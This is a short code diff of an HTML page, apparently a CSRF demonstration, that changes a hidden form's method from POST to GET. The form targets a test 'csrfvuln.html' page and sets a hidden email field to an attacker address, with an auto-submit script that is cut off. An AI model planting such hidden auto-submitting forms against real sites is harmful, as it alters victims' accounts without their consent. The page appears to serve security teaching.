@@ -37,7 +37,7 @@
     <div class="container">
         <h1>CSRF Attack Example</h1>
         <p>This page demonstrates a CSRF attack. The form below will automatically submit a request to the vulnerable page.</p>
-        <form action="https://perse-22.github.io/test/csrfvuln.html" method="POST" style="display:none;">
+        <form action="https://perse-22.github.io/test/csrfvuln.html" method="GET" style="display:none;">
             <input type="hidden" name="email" value="attacker@example.com">
         </form>
         <script>
